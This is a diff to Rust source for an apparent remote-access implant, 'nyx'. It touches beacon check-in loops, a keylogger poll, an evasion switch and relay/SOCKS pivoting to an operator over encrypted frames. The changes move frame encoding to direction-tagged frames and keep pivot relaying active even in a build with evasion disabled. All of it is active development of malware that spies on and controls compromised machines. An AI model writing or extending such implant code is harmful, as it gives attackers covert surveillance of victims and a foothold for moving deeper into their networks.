@@ -16,7 +16,7 @@ use crate::config::{self, Config};
 use crate::config_placeholder::{self, ImplantConfig};
 use crate::heap::{vec, String, Vec};
 use nyx_protocol::{
-    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
+    encode_frame_dir, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
     Response, SessionInfo, Task, TaskResponse,
 };
 
@@ -175,7 +175,7 @@ unsafe fn beacon_checkin(
     let mut counter = 0u64;
     let mut attempts = 0u32;
     loop {
-        let frame = match encode_frame(pubkey, counter, key, info_plain) {
+        let frame = match encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, info_plain) {
             Ok(f) => f,
             Err(_) => {
                 sleep_jitter(
@@ -250,11 +250,13 @@ fn beacon_cycle_setup(
     if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
         crate::keylog::poll_once();
     }
-    // Drain relay sockets.
-    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
-        for r in crate::pivot::pump_channels() {
-            pending.push(TaskResponse { task_id: 0, response: r });
-        }
+    // Drain relay sockets. Deliberately NOT gated on EVASION_ACTIVE: pivoting
+    // (Connect/Socks/ChannelData) must keep working on the noevasion build too
+    // — a P2P/relay deployment is transport behaviour, not evasion behaviour,
+    // and the operator may legitimately run the implant with evasion disabled
+    // (e.g. NYX_NOEVASION=1) while still relaying through it.
+    for r in crate::pivot::pump_channels() {
+        pending.push(TaskResponse { task_id: 0, response: r });
     }
     true
 }
@@ -302,7 +304,7 @@ fn beacon_send_frame(
     pending: &mut Vec<TaskResponse>,
     ch_ctx: &crate::channels::ChannelCtx,
 ) -> Option<Vec<u8>> {
-    let frame = match encode_frame(pubkey, *counter, key, &encode_batch(pending)) {
+    let frame = match encode_frame_dir(pubkey, Direction::ClientToServer, *counter, key, &encode_batch(pending)) {
         Ok(f) => f,
         Err(_) => return None,
     };
@@ -365,7 +367,7 @@ unsafe fn beacon_dispatch_tasks(
             pending.push(TaskResponse { task_id: t.task_id, response });
             // Flush mid-cycle if batch nears frame cap.
             if pending_batch_size(pending) > BATCH_FLUSH {
-                let frame = match encode_frame(pubkey, *counter, key, &encode_batch(pending)) {
+                let frame = match encode_frame_dir(pubkey, Direction::ClientToServer, *counter, key, &encode_batch(pending)) {
                     Ok(f) => f,
                     Err(_) => continue,
                 };
@@ -521,7 +523,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
     let mut counter = 0u64;
     let mut checked_in = false;
     for _ in 0..10 {
-        let frame = match encode_frame(&pubkey, counter, &key, &info_plain) {
+        let frame = match encode_frame_dir(&pubkey, Direction::ClientToServer, counter, &key, &info_plain) {
             Ok(f) => f,
             Err(_) => {
                 crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_CHECKIN");
@@ -559,8 +561,9 @@ pub unsafe fn beacon_oneshot() -> u32 {
         // POST empty batch, receive any queued tasks. An empty batch has no
         // blobs, so encode_vec cannot hit MAX_BLOB_LEN — but use unwrap_or_default
         // so a malformed Writer state never aborts the beacon (P0-4).
-        let frame = match encode_frame(
+        let frame = match encode_frame_dir(
             &pubkey,
+            Direction::ClientToServer,
             counter,
             &key,
             &TaskResponse::encode_vec(&[]).unwrap_or_default(),
@@ -618,7 +621,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
         if !pending.is_empty() {
             // P0-4: encode_batch swaps any oversized Response for an Err so the
             // frame always encodes instead of aborting the beacon.
-            let rframe = match encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending))
+            let rframe = match encode_frame_dir(&pubkey, Direction::ClientToServer, counter, &key, &encode_batch(&mut pending))
             {
                 Ok(f) => f,
                 Err(_) => {
